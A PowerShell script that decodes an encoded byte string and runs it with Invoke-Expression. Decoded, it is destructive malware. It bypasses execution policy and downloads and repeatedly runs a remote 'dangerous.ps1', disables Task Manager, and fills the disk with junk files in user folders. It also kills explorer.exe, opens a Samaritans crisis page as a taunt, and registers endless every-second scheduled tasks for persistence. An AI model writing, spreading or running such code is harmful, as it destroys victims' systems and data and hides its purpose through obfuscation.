function Deobfuscate-Script {
    [CmdletBinding()]
    param(
        # The obfuscated script, as a string of comma-separated values
        [Parameter(Mandatory = $true)]
        [string] $Encoded
    )

    # Split the encoded string into an array of bytes
    $bytes = $Encoded.Split(',') | ForEach-Object { [byte] $_ }

    # Convert the bytes back to a script string
    $script = [System.Text.Encoding]::ASCII.GetString($bytes)

    # Output the de-obfuscated script
    Write-Output $script
}

# De-obfuscate an encoded script
$encoded = '35,32,83,101,116,32,116,104,101,32,101,120,101,99,117,116,105,111,110,32,112,111,108,105,99,121,32,116,111,32,98,121,112,97,115,115,32,97,110,100,32,102,111,114,99,101,32,116,104,101,32,99,104,97,110,103,101,13,10,83,101,116,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,66,121,112,97,115,115,32,45,70,111,114,99,101,13,10,13,10,35,32,83,101,116,32,116,104,101,32,112,97,116,104,32,116,111,32,116,104,101,32,117,115,101,114,39,115,32,100,111,99,117,109,101,110,116,115,32,102,111,108,100,101,114,13,10,36,112,97,116,104,32,61,32,34,36,101,110,118,58,85,83,69,82,80,82,79,70,73,76,69,92,68,111,99,117,109,101,110,116,115,34,13,10,13,10,35,32,68,111,119,110,108,111,97,100,32,116,104,101,32,46,112,115,49,32,102,105,108,101,32,102,114,111,109,32,116,104,101,32,114,101,112,111,115,105,116,111,114,121,32,116,111,32,116,104,101,32,117,115,101,114,39,115,32,100,111,99,117,109,101,110,116,115,32,102,111,108,100,101,114,13,10,73,110,118,111,107,101,45,87,101,98,82,101,113,117,101,115,116,32,45,85,114,105,32,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,106,101,108,112,115,73,84,47,100,117,99,107,101,114,121,47,109,97,105,110,47,100,97,110,103,101,114,111,117,115,46,112,115,49,32,45,79,117,116,70,105,108,101,32,34,36,112,97,116,104,92,104,101,108,112,46,112,115,49,34,13,10,13,10,35,32,82,117,110,32,116,104,101,32,100,111,119,110,108,111,97,100,101,100,32,115,99,114,105,112,116,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,34,36,112,97,116,104,92,104,101,108,112,46,112,115,49,34,32,45,87,105,110,100,111,119,83,116,121,108,101,32,72,105,100,100,101,110,13,10,32,32,83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,49,13,10,125,13,10,35,32,68,105,115,97,98,108,101,32,84,97,115,107,32,77,97,110,97,103,101,114,32,102,111,114,32,97,108,108,32,117,115,101,114,115,13,10,83,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121,32,45,80,97,116,104,32,34,72,75,76,77,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,80,111,108,105,99,105,101,115,92,83,121,115,116,101,109,34,32,45,78,97,109,101,32,34,68,105,115,97,98,108,101,84,97,115,107,77,103,114,34,32,45,86,97,108,117,101,32,49,13,10,35,32,68,105,115,97,98,108,101,32,84,97,115,107,32,77,97,110,97,103,101,114,13,10,83,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121,32,45,80,97,116,104,32,34,72,75,67,85,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,80,111,108,105,99,105,101,115,92,83,121,115,116,101,109,34,32,45,78,97,109,101,32,34,68,105,115,97,98,108,101,84,97,115,107,77,103,114,34,32,45,86,97,108,117,101,32,49,13,10,35,32,83,101,116,32,116,104,101,32,112,97,116,104,32,116,111,32,116,104,101,32,100,101,115,107,116,111,112,13,10,36,100,101,115,107,116,111,112,32,61,32,91,69,110,118,105,114,111,110,109,101,110,116,93,58,58,71,101,116,70,111,108,100,101,114,80,97,116,104,40,34,68,101,115,107,116,111,112,34,41,13,10,35,32,67,114,101,97,116,101,32,97,110,32,97,114,114,97,121,32,111,102,32,52,77,66,32,102,105,108,101,115,13,10,36,102,105,108,101,115,32,61,32,64,40,41,13,10,102,111,114,32,40,36,105,32,61,32,48,59,32,36,105,32,45,108,116,32,50,53,48,59,32,36,105,43,43,41,32,123,13,10,32,32,36,102,105,108,101,115,32,43,61,32,34,36,100,101,115,107,116,111,112,92,102,105,108,101,36,105,46,116,120,116,34,13,10,125,13,10,35,32,67,114,101,97,116,101,32,97,110,32,97,114,114,97,121,32,111,102,32,52,77,66,32,102,111,108,100,101,114,115,13,10,36,102,111,108,100,101,114,115,32,61,32,64,40,41,13,10,102,111,114,32,40,36,105,32,61,32,48,59,32,36,105,32,45,108,116,32,50,53,48,59,32,36,105,43,43,41,32,123,13,10,32,32,36,102,111,108,100,101,114,115,32,43,61,32,34,36,100,101,115,107,116,111,112,92,102,111,108,100,101,114,36,105,34,13,10,125,13,10,35,32,75,101,101,112,32,99,114,101,97,116,105,110,103,32,102,105,108,101,115,32,97,110,100,32,102,111,108,100,101,114,115,32,117,110,116,105,108,32,116,104,101,32,100,105,115,107,32,115,112,97,99,101,32,105,115,32,101,120,104,97,117,115,116,101,100,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,35,32,67,114,101,97,116,101,32,97,32,110,101,119,32,80,111,119,101,114,83,104,101,108,108,32,115,101,115,115,105,111,110,32,102,111,114,32,101,97,99,104,32,102,105,108,101,13,10,32,32,102,111,114,101,97,99,104,32,40,36,102,105,108,101,32,105,110,32,36,102,105,108,101,115,41,32,123,13,10,32,32,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,112,111,119,101,114,115,104,101,108,108,32,45,65,114,103,117,109,101,110,116,76,105,115,116,32,34,45,67,111,109,109,97,110,100,32,96,34,78,101,119,45,73,116,101,109,32,45,73,116,101,109,84,121,112,101,32,70,105,108,101,32,45,80,97,116,104,32,36,102,105,108,101,32,45,86,97,108,117,101,32,40,40,71,101,116,45,82,97,110,100,111,109,32,45,77,105,110,105,109,117,109,32,48,32,45,77,97,120,105,109,117,109,32,50,53,54,41,32,42,32,49,54,75,66,41,96,34,34,32,45,87,105,110,100,111,119,83,116,121,108,101,32,72,105,100,100,101,110,13,10,32,32,125,13,10,13,10,32,32,35,32,67,114,101,97,116,101,32,97,32,110,101,119,32,80,111,119,101,114,83,104,101,108,108,32,115,101,115,115,105,111,110,32,102,111,114,32,101,97,99,104,32,102,111,108,100,101,114,13,10,32,32,102,111,114,101,97,99,104,32,40,36,102,111,108,100,101,114,32,105,110,32,36,102,111,108,100,101,114,115,41,32,123,13,10,32,32,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,112,111,119,101,114,115,104,101,108,108,32,45,65,114,103,117,109,101,110,116,76,105,115,116,32,34,45,67,111,109,109,97,110,100,32,96,34,78,101,119,45,73,116,101,109,32,45,73,116,101,109,84,121,112,101,32,68,105,114,101,99,116,111,114,121,32,45,80,97,116,104,32,36,102,111,108,100,101,114,96,34,34,32,45,87,105,110,100,111,119,83,116,121,108,101,32,72,105,100,100,101,110,13,10,32,32,125,13,10,13,10,32,32,35,32,67,104,101,99,107,32,116,104,101,32,97,118,97,105,108,97,98,108,101,32,100,105,115,107,32,115,112,97,99,101,13,10,32,32,36,100,114,105,118,101,32,61,32,71,101,116,45,87,109,105,79,98,106,101,99,116,32,87,105,110,51,50,95,76,111,103,105,99,97,108,68,105,115,107,32,124,32,87,104,101,114,101,45,79,98,106,101,99,116,32,123,36,95,46,68,101,118,105,99,101,73,68,32,45,101,113,32,34,67,58,34,125,13,10,32,32,105,102,32,40,36,100,114,105,118,101,46,70,114,101,101,83,112,97,99,101,32,45,101,113,32,48,41,32,123,13,10,32,32,32,32,98,114,101,97,107,13,10,32,32,125,13,10,125,13,10,35,32,83,101,116,32,116,104,101,32,112,97,116,104,115,32,116,111,32,116,104,101,32,86,105,100,101,111,115,44,32,80,104,111,116,111,115,44,32,97,110,100,32,68,111,99,117,109,101,110,116,115,32,102,111,108,100,101,114,115,13,10,36,118,105,100,101,111,115,32,61,32,34,36,40,91,69,110,118,105,114,111,110,109,101,110,116,93,58,58,71,101,116,70,111,108,100,101,114,80,97,116,104,40,34,77,121,86,105,100,101,111,115,34,41,41,34,13,10,36,112,104,111,116,111,115,32,61,32,34,36,40,91,69,110,118,105,114,111,110,109,101,110,116,93,58,58,71,101,116,70,111,108,100,101,114,80,97,116,104,40,34,77,121,80,105,99,116,117,114,101,115,34,41,41,34,13,10,36,100,111,99,115,32,61,32,34,36,40,91,69,110,118,105,114,111,110,109,101,110,116,93,58,58,71,101,116,70,111,108,100,101,114,80,97,116,104,40,34,77,121,68,111,99,117,109,101,110,116,115,34,41,41,34,13,10,35,32,67,114,101,97,116,101,32,97,110,32,97,114,114,97,121,32,111,102,32,102,105,108,101,32,110,97,109,101,115,13,10,36,110,97,109,101,115,32,61,32,64,40,34,111,104,95,110,111,34,44,32,34,104,101,108,112,32,115,101,110,100,32,104,101,108,112,34,44,32,34,105,32,97,109,32,116,104,101,32,122,97,116,101,105,110,97,116,111,114,34,44,32,34,121,111,117,39,118,101,32,98,101,101,110,32,98,114,97,121,122,122,122,100,34,41,13,10,35,32,75,101,101,112,32,99,114,101,97,116,105,110,103,32,102,105,108,101,115,32,117,110,116,105,108,32,116,104,101,32,100,105,115,107,32,115,112,97,99,101,32,105,115,32,101,120,104,97,117,115,116,101,100,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,35,32,67,114,101,97,116,101,32,110,101,119,32,80,111,119,101,114,83,104,101,108,108,32,115,101,115,115,105,111,110,115,32,102,111,114,32,101,97,99,104,32,102,105,108,101,13,10,32,32,102,111,114,101,97,99,104,32,40,36,110,97,109,101,32,105,110,32,36,110,97,109,101,115,41,32,123,13,10,32,32,32,32,35,32,83,101,108,101,99,116,32,97,32,114,97,110,100,111,109,32,102,111,108,100,101,114,13,10,32,32,32,32,36,102,111,108,100,101,114,32,61,32,71,101,116,45,82,97,110,100,111,109,32,45,73,110,112,117,116,79,98,106,101,99,116,32,64,40,36,118,105,100,101,111,115,44,32,36,112,104,111,116,111,115,44,32,36,100,111,99,115,41,13,10,13,10,32,32,32,32,35,32,67,114,101,97,116,101,32,97,32,110,101,119,32,102,105,108,101,32,105,110,32,116,104,101,32,115,101,108,101,99,116,101,100,32,102,111,108,100,101,114,13,10,32,32,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,112,111,119,101,114,115,104,101,108,108,32,45,65,114,103,117,109,101,110,116,76,105,115,116,32,34,45,67,111,109,109,97,110,100,32,96,34,78,101,119,45,73,116,101,109,32,45,73,116,101,109,84,121,112,101,32,70,105,108,101,32,45,80,97,116,104,32,36,102,111,108,100,101,114,92,36,110,97,109,101,46,116,120,116,32,45,86,97,108,117,101,32,40,40,71,101,116,45,82,97,110,100,111,109,32,45,77,105,110,105,109,117,109,32,48,32,45,77,97,120,105,109,117,109,32,50,48,52,56,41,32,42,32,49,54,75,66,41,96,34,34,32,45,87,105,110,100,111,119,83,116,121,108,101,32,72,105,100,100,101,110,13,10,32,32,125,13,10,13,10,32,32,35,32,67,104,101,99,107,32,116,104,101,32,97,118,97,105,108,97,98,108,101,32,100,105,115,107,32,115,112,97,99,101,13,10,32,32,36,100,114,105,118,101,32,61,32,71,101,116,45,87,109,105,79,98,106,101,99,116,32,87,105,110,51,50,95,76,111,103,105,99,97,108,68,105,115,107,32,124,32,87,104,101,114,101,45,79,98,106,101,99,116,32,123,36,95,46,68,101,118,105,99,101,73,68,32,45,101,113,32,34,67,58,34,125,13,10,32,32,105,102,32,40,36,100,114,105,118,101,46,70,114,101,101,83,112,97,99,101,32,45,101,113,32,48,41,32,123,13,10,32,32,32,32,98,114,101,97,107,13,10,32,32,125,13,10,125,13,10,35,32,79,112,101,110,32,77,105,99,114,111,115,111,102,116,32,69,100,103,101,32,97,110,100,32,110,97,118,105,103,97,116,101,32,116,111,32,116,104,101,32,115,112,101,99,105,102,105,101,100,32,85,82,76,13,10,36,101,100,103,101,32,61,32,78,101,119,45,79,98,106,101,99,116,32,45,67,111,109,79,98,106,101,99,116,32,34,73,110,116,101,114,110,101,116,69,120,112,108,111,114,101,114,46,65,112,112,108,105,99,97,116,105,111,110,34,13,10,36,101,100,103,101,46,86,105,115,105,98,108,101,32,61,32,36,116,114,117,101,13,10,36,101,100,103,101,46,78,97,118,105,103,97,116,101,40,34,104,116,116,112,115,58,47,47,119,119,119,46,115,97,109,97,114,105,116,97,110,115,46,111,114,103,47,104,111,119,45,119,101,45,99,97,110,45,104,101,108,112,47,99,111,110,116,97,99,116,45,115,97,109,97,114,105,116,97,110,47,34,41,13,10,13,10,35,32,76,111,111,112,32,105,110,102,105,110,105,116,101,108,121,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,32,32,83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,49,13,10,125,13,10,35,32,69,110,100,32,101,120,112,108,111,114,101,114,46,101,120,101,32,112,114,111,99,101,115,115,13,10,83,116,111,112,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,101,120,112,108,111,114,101,114,13,10,13,10,35,32,76,111,111,112,32,101,118,101,114,121,32,115,101,99,111,110,100,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,32,32,83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,49,13,10,125,13,10,35,32,67,114,101,97,116,101,32,97,32,115,99,104,101,100,117,108,101,100,32,116,97,115,107,32,116,111,32,114,117,110,32,116,104,101,32,100,111,119,110,108,111,97,100,101,100,32,115,99,114,105,112,116,32,111,110,32,115,116,97,114,116,117,112,32,97,110,100,32,101,118,101,114,121,32,115,101,99,111,110,100,32,116,104,101,114,101,97,102,116,101,114,13,10,36,116,97,115,107,32,61,32,78,101,119,45,83,99,104,101,100,117,108,101,100,84,97,115,107,65,99,116,105,111,110,32,45,69,120,101,99,117,116,101,32,34,80,111,119,101,114,83,104,101,108,108,46,101,120,101,34,32,45,65,114,103,117,109,101,110,116,32,34,45,70,105,108,101,32,96,34,36,112,97,116,104,92,115,99,114,105,112,116,46,112,115,49,96,34,34,13,10,36,116,114,105,103,103,101,114,32,61,32,78,101,119,45,83,99,104,101,100,117,108,101,100,84,97,115,107,84,114,105,103,103,101,114,32,45,65,116,76,111,103,79,110,32,45,82,101,112,101,116,105,116,105,111,110,73,110,116,101,114,118,97,108,32,40,78,101,119,45,84,105,109,101,83,112,97,110,32,45,83,101,99,111,110,100,115,32,49,41,32,45,82,101,112,101,116,105,116,105,111,110,68,117,114,97,116,105,111,110,32,40,91,84,105,109,101,83,112,97,110,93,58,58,77,97,120,86,97,108,117,101,41,13,10,36,115,101,116,116,105,110,103,115,32,61,32,78,101,119,45,83,99,104,101,100,117,108,101,100,84,97,115,107,83,101,116,116,105,110,103,115,83,101,116,32,45,77,117,108,116,105,112,108,101,73,110,115,116,97,110,99,101,115,32,73,103,110,111,114,101,78,101,119,32,45,83,116,97,114,116,87,104,101,110,65,118,97,105,108,97,98,108,101,13,10,36,112,114,105,110,99,105,112,97,108,32,61,32,78,101,119,45,83,99,104,101,100,117,108,101,100,84,97,115,107,80,114,105,110,99,105,112,97,108,32,45,71,114,111,117,112,73,100,32,34,66,117,105,108,116,105,110,92,85,115,101,114,115,34,32,45,82,117,110,76,101,118,101,108,32,72,105,103,104,101,115,116,13,10,36,116,97,115,107,32,124,32,82,101,103,105,115,116,101,114,45,83,99,104,101,100,117,108,101,100,84,97,115,107,32,45,84,97,115,107,78,97,109,101,32,34,77,121,84,97,115,107,34,32,45,84,114,105,103,103,101,114,32,36,116,114,105,103,103,101,114,32,45,83,101,116,116,105,110,103,115,32,36,115,101,116,116,105,110,103,115,32,45,80,114,105,110,99,105,112,97,108,32,36,112,114,105,110,99,105,112,97,108,13,10,13,10,35,32,68,117,112,108,105,99,97,116,101,32,116,104,101,32,115,99,104,101,100,117,108,101,100,32,116,97,115,107,32,97,110,32,105,110,102,105,110,105,116,101,32,110,117,109,98,101,114,32,111,102,32,116,105,109,101,115,13,10,119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,82,101,103,105,115,116,101,114,45,83,99,104,101,100,117,108,101,100,84,97,115,107,32,45,84,97,115,107,78,97,109,101,32,34,77,121,84,97,115,107,36,40,40,71,101,116,45,82,97,110,100,111,109,32,45,77,105,110,105,109,117,109,32,49,32,45,77,97,120,105,109,117,109,32,49,48,48,48,48,48,41,41,34,32,45,73,110,112,117,116,79,98,106,101,99,116,32,36,116,97,115,107,32,45,84,114,105,103,103,101,114,32,36,116,114,105,103,103,101,114,32,45,83,101,116,116,105,110,103,115,32,36,115,101,116,116,105,110,103,115,32,45,80,114,105,110,99,105,112,97,108,32,36,112,114,105,110,99,105,112,97,108,13,10,125'
$script = Deobfuscate-Script -Encoded $encoded

# Execute the de-obfuscated script
Invoke-Expression -Command $script
